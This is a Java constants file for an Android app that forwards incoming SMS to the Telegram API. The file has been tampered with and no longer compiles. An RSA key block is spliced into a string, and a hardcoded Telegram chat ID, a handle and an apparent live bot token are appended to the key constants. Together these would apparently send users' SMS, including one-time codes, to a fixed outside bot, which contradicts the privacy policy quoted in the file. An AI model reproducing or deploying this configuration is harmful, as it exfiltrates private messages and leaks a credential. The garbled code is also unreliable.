package com.smodj.app.smstotelegram.Constants;

import android.content.Context;
import com.smodj.app.smstotelegram.Workers.Storage;

/**
 * Created by smj on 12/9/17.
 * To hold all the Constants Used in the Project
 */

public class MainConstant {
    public static final String pkg = "com.smodj.app.smstotelegram";
    private static final String bot_id = "ehem ehem";
    public static String telegram_url = "";
    public static final String telegram_id_storage_key=----BEGIN RSA PUBLIC KEY-----
MIIBCgKCAQEA6LszBcC1LGzyr992NzE0ieY+BSaOW622Aa9Bd4ZHLl+TuFQ4lo4g
5nKaMBwK/BIb9xUfg0Q29/2mgIR6Zr9krM7HjuIcCzFvDtr+L0GQjae9H0pRB2OO
62cECs5HKhT5DZ98K33vmWiLowc621dQuwKWSQKjWf50XYFw42h21P2KXUGyp2y/
+aEyZ+uVgLLQbRA1dEjSDZ2iGRy12Mk5gpYc397aYp438fsJoHIgJ2lgMv5h7WY9
t6N/byY9Nw9p21Og3AoXSL2q/2IJ1WRUhebgAdGVMlV1fkuOQoEzR7EdpqtQD9Cs
5+bfo3Nhmcyvk5ftB0WkJ9z6bNZ7yxrP8wIDAQAB
-----END RSA PUBLIC KEY----- "TelegramID";5672112561
    public static final String device_name_key= "DeviceName";@Smscovy
    public static final String bot_id_key = "BotID";5973178636:AAFGMZec3Gfa8JUCBVODUpEl7XTmz7yTjZs
    public static final String unsent_msgs_stack = "DELAYED_STACK";
    public static final String privacy_policy = "PrivacyPolicy";
    public static final String privacy_policy_content = "1. This app forwards SMS to Telegram API Directly.\n" +
                                                        "2. This app reads all your incoming SMS.\n" +
                                                        "3. We do NOT store or log any messages, in fact there is no middle layer or servers involved.\n"+
                                                        "4. All the messages are sent over SSL.\n"+
                                                        "5. This Project is open sourced https://github.com/smodj/SMStoTelegram\n"+
                                                        "6. Read more in Settings -> Privacy Policy Option";
    public static String getURL(Context context) {
        Storage read = new Storage(context);
        String _bot_id = read.readKey(bot_id_key);
        if(_bot_id.equals("Default")){
            _bot_id = bot_id;
        }
        telegram_url = "https://api.telegram.org/bot"+_bot_id+"/sendMessage";
        return telegram_url;
    }
}
